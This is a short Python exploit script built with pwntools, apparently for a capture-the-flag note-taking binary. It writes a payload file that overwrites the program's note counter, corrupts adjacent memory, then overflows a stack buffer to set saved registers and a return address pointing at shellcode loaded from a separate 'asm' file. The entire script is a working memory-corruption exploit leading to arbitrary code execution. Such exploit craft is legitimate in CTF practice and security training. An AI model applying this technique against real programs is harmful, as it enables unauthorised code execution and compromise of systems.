from pwn import *

payload = b''

useless_note = b""
useless_note += b"1\n"
useless_note += b"\n"
useless_note += b"\n"

payload += useless_note * 4

# 5th note: Overwrite Total Note Number
payload += b"1\n"
payload += b"\n"
payload += b"111111111122222222223333333333X\xff"  # [0xc10, 0xc30)

# 6th note [c30, c68)
payload += b"1\n"
payload += b"\n"

payload += b"1234567" + p64(0xffffffffffffffff) + b"\n"

# 7th note: stack bof
payload += b""
payload += b"1\n"
payload += b"a" * 48 # title

target_r1 = 1
target_r2 = 1
target_r3 = 3
target_pc = 0xf30

# 0xf10
payload += p64(target_r3)
payload += p64(target_r2)
payload += p64(target_r1)  # first 8 bytes of the content (0xf20 - 0xf28)
payload += p64(target_pc)  # 8 ~ 16 bytes of the content (0xf28 - 0xf30)
# 0xf30

payload += open("asm", "rb").read()
payload += b"\n" + b"\n"

with open("payload2", "wb") as f:
    f.write(payload)